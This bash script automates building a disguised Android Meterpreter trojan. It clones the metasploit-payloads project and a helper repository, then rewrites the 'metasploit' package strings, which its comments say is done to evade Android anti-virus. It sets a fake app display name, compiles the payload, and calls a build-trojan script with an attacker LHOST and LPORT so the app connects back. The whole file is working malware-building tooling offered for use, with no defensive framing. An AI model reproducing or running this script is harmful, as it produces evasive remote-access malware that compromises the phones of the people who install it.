#!/bin/bash

#The name that shows up on screen
PACKAGE_NAME="$3"

#This is the default change string used in the change-scripts bash scripts
ORIGINAL_STRING="amo"

#This is what ORIGINAL_STRING becomes
NEW_STRING="$1"

#This is the default string we change to evade Android anti-virus (com.metasploit.stage)
OTHER_STRING="metasploit"

#This is the string that will replace OTHER_STRING
SECOND_STRING="$2"

#This is the directory name that metasploit-payloads project will be downloaded to
MSFPAYLOADS="msfpayloads"

#This is a backup directory in case things go wrong
MSFPAYLOADS_BAK="msfpayloads.bak"

#This is the metasploit-payloads project link
MSFPAYLOADS_LINK="https://github.com/rapid7/metasploit-payloads.git" 

#This is the directory name that our change scripts will be downloaded to
CSCRIPTS="change-scripts"

#This is the backup directory in case things go wrong
CSCRIPTS_BAK="change-scripts.bak"

#This is the change scripts link
CSCRIPTS_LINK="https://github.com/amodayus/REA820.git"

#Feel free to change this to where the sdk and ndk is on your system
#This is the location of the Android SDK
ASDK="/usr/share/android-sdk"

#This is the location of the Android NDK
ANDK="/usr/share/android-ndk"

FRAMEWORK_NAME="$1-framework"

LHOST=$4

LPORT=$5

FILENAME=$6

#Check arguments
if [ $# -eq 6 ]; then

	:

else

	echo "$0 <new-string> <original-string> <appdrawer-name> <LHOST> <LPORT> <filename>" 
	echo "To rename com.metasploit.stage to com.test.stage run as: $0 test metasploit trojanapp 192.168.1.50 4444"
	exit 0

fi

if [ -d "$MSFPAYLOADS" ]; then

	echo "[!] $MSFPAYLOADS exists!"
	rm -rf $MSFPAYLOADS
	echo "[!] Removing msfpayloads download."
	sleep 1
fi

if [ -d "$MSFPAYLOADS_BAK" ]; then
		
	echo "[+] Copying backup directory over..."
	cp -r $MSFPAYLOADS_BAK $MSFPAYLOADS

else

	echo "[+] Downloading $MSFPAYLOADS..."
	git clone $MSFPAYLOADS_LINK $MSFPAYLOADS_BAK
	cp -r $MSFPAYLOADS_BAK $MSFPAYLOADS

fi


if [ -d "$CSCRIPTS" ]; then

	:

else

	echo "[!] $CSCRIPTS doesn't exist!"
	echo "[!] Checking if $CSCRIPTS_BAK exists..."

	if [ -d "$CSCRIPTS_BAK" ]; then
		
		echo "[!] $CSCRIPTS_BAK exists!"
		echo "[!] Copying $CSCRIPTS_BAK to $CSRIPTS!"
		cp -r $CSCRIPTS_BAK $CSCRIPTS

	else

		echo "[!] $CSCRIPTS_BAK doesn't exist!"
		echo "[+] Downloading $CSCRIPTS..."
		git clone $CSCRIPTS_LINK $CSCRIPTS_BAK
		cp -r $CSCRIPTS_BAK $CSCRIPTS
	fi

fi

#At this points let's change the strings and folders we want to change
echo "[!] Modifying and copying $CSCRIPTS bash files to $MSFPAYLOADS/java/ directory..."
cd $CSCRIPTS/rename-apk

#Change script here, copy over to msfpayloads/java directory
for i in `ls *.bash`; do cat $i | sed "s/$ORIGINAL_STRING/$NEW_STRING/g;s/$OTHER_STRING/$SECOND_STRING/g" > ../../$MSFPAYLOADS/java/$i ; done

#Now run the change-scripts
echo "[+] Modifying the trojan name..."
cd ../../$MSFPAYLOADS/java/

#Do this 5 times, a bit excessive
for i in `seq 1 5`; do bash replace-pkg.bash; done
for i in `seq 1 5`; do bash change-folder-structure.bash; done

echo "[+] Modifying package display name"

sed -i "s/MainActivity/$PACKAGE_NAME/" androidpayload/app/src/main/res/values/strings.xml

find ./ -name AndroidManifest.xml -exec vi {} +

echo "[+] Compiling..."

mvn package -Dandroid.sdk.path=$ASDK -Dandroid.ndk.path=$ANDK -Dandroid.release=true -P deploy

cd ../../

echo "[+] Building..."

#Remeber to fill the variables in accordingly in the build-trojan bash script
./build-trojan.bash $FRAMEWORK_NAME $LHOST $LPORT $FILENAME
